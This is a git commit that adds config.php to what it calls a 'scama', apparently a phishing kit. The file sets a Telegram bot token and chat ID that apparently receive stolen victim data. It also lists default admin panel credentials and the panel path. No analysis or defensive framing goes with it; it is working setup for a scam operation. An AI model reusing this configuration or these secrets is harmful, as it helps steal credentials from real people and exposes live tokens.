6c526964264ed586d61081028aa4b056fa6e08d7
backupl <104275662+backupl@users.noreply.github.com>
2022-04-23 20:17:29 +0100

    Add files via upload

---
+++ config.php
@@ -0,0 +1,10 @@
+<?php
+// setting scama
+
+$botToken="5287783353:AAHUPeYMNz62Md7jPoXWovazGcqV-YY7VC8"; // token bot telegram
+$chatId="1947824557";  // chatId telegram
+//Default Username for admin panel: zae3m
+//Default Password for admin panel: @zae3m_tut
+//You can Change them after you login to panel
+//To visit panel: scama link/Happy
+?>
